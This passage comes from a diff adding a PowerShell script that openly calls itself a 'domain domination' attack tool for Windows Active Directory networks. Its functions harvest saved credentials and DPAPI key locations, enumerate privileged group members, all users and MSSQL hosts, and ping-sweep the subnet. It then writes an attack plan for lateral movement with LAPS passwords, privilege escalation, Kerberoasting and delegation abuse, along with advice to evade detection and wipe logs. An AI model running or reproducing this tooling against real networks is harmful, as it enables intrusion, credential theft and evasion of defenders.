+                    Log-Critical "MSSQL INSTANCE FOUND: $computer"
+                    Add-Content -Path "$OUTPUT_DIR\mssql_instances.txt" -Value $computer
+                }
+            }
+            Random-Delay
+        }
+    }
+    
+    Log-Success "Found $($mssqlInstances.Count) MSSQL instances"
+}
+
+# 7. CREDENTIALS HARVESTING - PURE NATIVE
+function Harvest-Credentials {
+    Log-Info "[7] CREDENTIALS HARVESTING"
+    
+    # Check for saved credentials using native methods
+    Find-SavedCreds
+    
+    # Check running processes for credential-related processes
+    Find-ProcessCredentials
+    
+    # Check for DPAPI master keys
+    Find-DPAPIMasterKeys
+}
+
+function Find-SavedCreds {
+    Log-Info "Checking for saved credentials"
+    
+    # Check Credential Manager via cmdkey
+    try {
+        $creds = cmdkey /list 2>$null
+        if ($creds -match "Target:") {
+            Log-Warning "Saved credentials found in Credential Manager"
+            $creds | Out-File "$OUTPUT_DIR\saved_credentials.txt"
+        }
+    }
+    catch {
+        Log-Warning "cmdkey not available or failed"
+    }
+    
+    # Check registry for saved credentials
+    try {
+        $regCreds = reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL 2>$null
+        if ($regCreds -match "AutoConfigURL") {
+            Log-Info "Found proxy auto-config settings"
+        }
+    }
+    catch { }
+}
+
+function Find-ProcessCredentials {
+    Log-Info "Checking running processes for credentials"
+    
+    # Look for processes that might contain credentials
+    $suspiciousProcesses = Get-Process | Where-Object {
+        $_.ProcessName -match "cmdkey|vault|cred|mstsc|rdp"
+    }
+    
+    foreach ($proc in $suspiciousProcesses) {
+        Log-Warning "Suspicious process running: $($proc.ProcessName) (PID: $($proc.Id))"
+        Add-Content -Path "$OUTPUT_DIR\suspicious_processes.txt" -Value "$($proc.ProcessName) (PID: $($proc.Id))"
+    }
+}
+
+function Find-DPAPIMasterKeys {
+    Log-Info "Checking for DPAPI master keys"
+    
+    try {
+        $dpapiPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Protect"
+        if (Test-Path $dpapiPath) {
+            $masterKeys = Get-ChildItem -Path $dpapiPath -Recurse -ErrorAction SilentlyContinue
+            Log-Info "Found $($masterKeys.Count) DPAPI master key files"
+        }
+    }
+    catch {
+        # Access denied
+    }
+}
+
+# 8. ACTIVE DIRECTORY RECONNAISSANCE - PURE NATIVE
+function Invoke-ADRecon {
+    Log-Info "[8] ACTIVE DIRECTORY RECONNAISSANCE"
+    
+    try {
+        $domainDN = "DC=" + $DOMAIN.Replace(".", ",DC=")
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($DOMAIN_CONTROLLERS[0])/$domainDN")
+        
+        # Get domain info
+        $searcher.Filter = "(objectClass=domain)"
+        $domainInfo = $searcher.FindOne()
+        if ($domainInfo) {
+            "Domain: $DOMAIN" | Out-File "$OUTPUT_DIR\domain_info.txt"
+            "Distinguished Name: $($domainInfo.Properties.distinguishedname[0])" | Out-File "$OUTPUT_DIR\domain_info.txt" -Append
+        }
+        
+        # Get privileged groups members
+        Find-PrivilegedGroupMembers
+        
+        # Get all users
+        Find-AllUsers
+        
+        Log-Success "Active Directory reconnaissance completed"
+    }
+    catch {
+        Log-Error "AD reconnaissance failed: $($_.Exception.Message)"
+    }
+}
+
+function Find-PrivilegedGroupMembers {
+    Log-Info "Finding privileged group members"
+    
+    $privilegedGroups = @(
+        "CN=Domain Admins,CN=Users,DC=$($DOMAIN.Replace('.', ',DC='))",
+        "CN=Enterprise Admins,CN=Users,DC=$($DOMAIN.Replace('.', ',DC='))",
+        "CN=Schema Admins,CN=Users,DC=$($DOMAIN.Replace('.', ',DC='))",
+        "CN=Administrators,CN=Builtin,DC=$($DOMAIN.Replace('.', ',DC='))"
+    )
+    
+    foreach ($groupDN in $privilegedGroups) {
+        try {
+            $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($DOMAIN_CONTROLLERS[0])")
+            $searcher.Filter = "(distinguishedName=$groupDN)"
+            $group = $searcher.FindOne()
+            
+            if ($group) {
+                $groupName = $group.Properties.name[0]
+                $members = $group.Properties.member
+                
+                "Group: $groupName" | Out-File "$OUTPUT_DIR\group_$($groupName.Replace(' ','_')).txt"
+                "Members:" | Out-File "$OUTPUT_DIR\group_$($groupName.Replace(' ','_')).txt" -Append
+                if ($members) {
+                    $members | Out-File "$OUTPUT_DIR\group_$($groupName.Replace(' ','_')).txt" -Append
+                    Log-Info "Found $($members.Count) members in $groupName"
+                } else {
+                    "No members found" | Out-File "$OUTPUT_DIR\group_$($groupName.Replace(' ','_')).txt" -Append
+                }
+            }
+        }
+        catch {
+            Log-Warning "Failed to query group $groupDN"
+        }
+    }
+}
+
+function Find-AllUsers {
+    Log-Info "Finding all domain users"
+    
+    try {
+        $domainDN = "DC=" + $DOMAIN.Replace(".", ",DC=")
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$($DOMAIN_CONTROLLERS[0])/$domainDN")
+        $searcher.Filter = "(objectCategory=user)"
+        $searcher.PageSize = 1000
+        $users = $searcher.FindAll()
+        
+        "Total Users: $($users.Count)" | Out-File "$OUTPUT_DIR\all_users.txt"
+        "" | Out-File "$OUTPUT_DIR\all_users.txt" -Append
+        
+        foreach ($user in $users) {
+            $samAccountName = $user.Properties.samaccountname[0]
+            $displayName = $user.Properties.displayname[0]
+            "User: $samAccountName ($displayName)" | Out-File "$OUTPUT_DIR\all_users.txt" -Append
+        }
+        
+        Log-Success "Found $($users.Count) domain users"
+    }
+    catch {
+        Log-Error "Failed to enumerate users: $($_.Exception.Message)"
+    }
+}
+
+# 9. NETWORK DISCOVERY - PURE NATIVE
+function Invoke-NetworkDiscovery {
+    Log-Info "[9] NETWORK DISCOVERY"
+    
+    # Get local IP info
+    $ipAddresses = [System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME)
+    "Local IP Addresses:" | Out-File "$OUTPUT_DIR\network_info.txt"
+    $ipAddresses | ForEach-Object { $_.IPAddressToString } | Out-File "$OUTPUT_DIR\network_info.txt" -Append
+    
+    # Ping sweep on local subnet
+    $localIP = $ipAddresses[0].IPAddressToString
+    if ($localIP) {
+        $subnet = $localIP -replace "\d+$", "*"
+        Log-Info "Performing ping sweep on local subnet: $subnet"
+        
+        1..254 | ForEach-Object {
+            $ip = $subnet -replace "\*", $_
+            if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
+                Log-Info "Live host: $ip"
+                Add-Content -Path "$OUTPUT_DIR\live_hosts.txt" -Value $ip
+            }
+        }
+    }
+}
+
+# 10. GENERATE COMPREHENSIVE ATTACK PLAN
+function Generate-AttackPlan {
+    Log-Info "[10] GENERATING COMPREHENSIVE ATTACK PLAN"
+    
+    $pwnedCount = 0
+    if (Test-Path "$OUTPUT_DIR\pwned_machines.txt") {
+        $pwnedCount = (Get-Content "$OUTPUT_DIR\pwned_machines.txt" | Measure-Object).Count
+    }
+    
+    $lapsCount = 0
+    if (Test-Path "$OUTPUT_DIR\laps_passwords.txt") {
+        $lapsCount = (Get-Content "$OUTPUT_DIR\laps_passwords.txt" | Measure-Object).Count
+    }
+    
+    $mssqlCount = 0
+    if (Test-Path "$OUTPUT_DIR\mssql_instances.txt") {
+        $mssqlCount = (Get-Content "$OUTPUT_DIR\mssql_instances.txt" | Measure-Object).Count
+    }
+    
+    $delegationCount = 0
+    if (Test-Path "$OUTPUT_DIR\delegation.txt") {
+        $delegationCount = (Get-Content "$OUTPUT_DIR\delegation.txt" | Measure-Object).Count
+    }
+    
+    $planContent = @"
+# COMPLETE DOMAIN DOMINATION ATTACK PLAN - WINDOWS NATIVE
+
+## CRITICAL FINDINGS SUMMARY
+$(if (Test-Path $CRITICAL_FINDINGS) { Get-Content $CRITICAL_FINDINGS -Raw } else { "No critical findings yet" })
+
+## QUICK WIN SUMMARY
+
+### 1. Immediate Access ($pwnedCount machines)
+$(if (Test-Path "$OUTPUT_DIR\pwned_machines.txt") { Get-Content "$OUTPUT_DIR\pwned_machines.txt" | Select-Object -First 10 } else { "None yet" })
+
+### 2. Kerberos & Delegation
+- **Delegation Vulnerabilities**: $delegationCount
+- **Service Accounts**: $(if (Test-Path "$OUTPUT_DIR\service_accounts.txt") { (Get-Content "$OUTPUT_DIR\service_accounts.txt" | Measure-Object).Count } else { 0 })
+- **AS-REP Roastable**: $(if (Test-Path "$OUTPUT_DIR\asrep_accounts.txt") { (Get-Content "$OUTPUT_DIR\asrep_accounts.txt" | Measure-Object).Count } else { 0 })
+
+### 3. Credential Opportunities
+- **LAPS Passwords**: $lapsCount
+- **MSSQL Instances**: $mssqlCount
+- **GPP Passwords**: $(if (Test-Path "$OUTPUT_DIR\gpp_passwords.txt") { (Get-Content "$OUTPUT_DIR\gpp_passwords.txt" | Measure-Object).Count } else { 0 })
+
+## EXECUTION ORDER
+
+### PHASE 1: LATERAL MOVEMENT
+# 1. Use LAPS passwords on compromised machines
+`$laps = Get-Content "$OUTPUT_DIR\laps_passwords.txt"
+foreach (`$line in `$laps) {
+    `$computer, `$password = `$line -split "`t"
+    # Use psexec or wmi to connect with: $DOMAIN\Administrator and `$password
+}
+
+# 2. Access discovered shares
+net use \\target\share
+
+### PHASE 2: PRIVILEGE ESCALATION
+# 1. Check for token privileges
+whoami /priv
+
+# 2. Check always install elevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# 3. Check for unquoted service paths
+Get-WmiObject -Class Win32_Service | Where-Object {`$_.PathName -like "* *" -and `$_.PathName -notlike "`"*`""}
+
+### PHASE 3: DOMAIN DOMINATION
+# 1. Kerberoasting with service accounts
+# Use found service accounts for Kerberoasting attacks
+
+# 2. Delegation attacks
+# Use constrained/unconstrained delegation for privilege escalation
+
+## CRITICAL FILES TO REVIEW
+
+1. **Critical Findings**: $CRITICAL_FINDINGS
+2. **LAPS passwords**: $OUTPUT_DIR\laps_passwords.txt  
+3. **Delegation targets**: $OUTPUT_DIR\delegation.txt
+4. **Service Accounts**: $OUTPUT_DIR\service_accounts.txt
+5. **GPP Passwords**: $OUTPUT_DIR\gpp_passwords.txt
+6. **MSSQL Instances**: $OUTPUT_DIR\mssql_instances.txt
+
+## OPERATIONAL SECURITY NOTES
+- Using only native Windows tools to avoid detection
+- Random delays between operations
+- Clean up logs and traces after operation
+- Use legitimate administrative tools for lateral movement
+"@
+
+    $planContent | Out-File "$OUTPUT_DIR\FULL_DOMINATION_PLAN.md"
+    Log-Success "Full attack plan generated: $OUTPUT_DIR\FULL_DOMINATION_PLAN.md"
+}
+
+# MAIN EXECUTION
+function Main {
+    Log-Info "Starting complete domain domination assessment using pure Windows native tools..."
+    
+    # Test connectivity first
+    if (-not (Test-DomainConnectivity)) {
+        Log-Error "Domain connectivity test failed. Exiting."
+        return
+    }
+    
+    # Run all attack modules
+    Find-AdminAccess
+    Find-Shares
+    Invoke-KerberosAttacks
+    Find-LAPS
+    Find-GPOMisconfig
+    Find-MSSQL
+    Harvest-Credentials
+    Invoke-ADRecon
+    Invoke-NetworkDiscovery
+    Generate-AttackPlan
+    
+    # Final summary
+    Log-Success "Domain domination assessment complete!"
+    Write-Host ""
+    Log-Critical "IMMEDIATE CRITICAL FINDINGS:"
+    if (Test-Path $CRITICAL_FINDINGS) {
+        Get-Content $CRITICAL_FINDINGS
+    } else {
+        Write-Host "No critical findings recorded"
+    }
+    Write-Host ""
+    Log-Info "Full results in: $OUTPUT_DIR"
+    Log-Info "Attack plan: $OUTPUT_DIR\FULL_DOMINATION_PLAN.md"
+}
+
+# Run main function
+Main
